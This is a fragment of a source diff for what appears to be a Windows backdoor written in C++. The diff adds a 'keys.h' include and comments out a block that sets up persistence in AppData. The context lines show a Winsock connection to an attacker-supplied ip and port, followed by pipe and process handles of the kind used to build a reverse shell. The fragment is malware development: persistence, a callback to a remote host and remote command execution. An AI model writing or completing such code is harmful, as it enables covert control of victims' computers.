@@ -3,9 +3,10 @@
 #include <filesystem>
 #include "include/socketconnection.h"
 #include "include/persist.h"
+#include "include/keys.h"
 
 int main() {
-    std::filesystem::path appdata_path = getAppDataPath();
+/*     std::filesystem::path appdata_path = getAppDataPath();
 
     if (appdata_path.empty()) {
         //std::cerr << "Could not find appdata variable. exiting..\n";
@@ -63,7 +64,7 @@ int main() {
 
     } else {
         //std::cout << "Persistence already exists." << std::endl;
-    }
+    } */
 
 
     // ---------- CONNECTION ----------
@@ -73,6 +74,9 @@ int main() {
     if (!initWinsock()) return 1;
     SOCKET s = connectToServer(ip, port);
     if (s == INVALID_SOCKET) return 1;
+
+
+
 
     HANDLE hReadOut, hWriteOut, hReadIn, hWriteIn;
     PROCESS_INFORMATION pi;
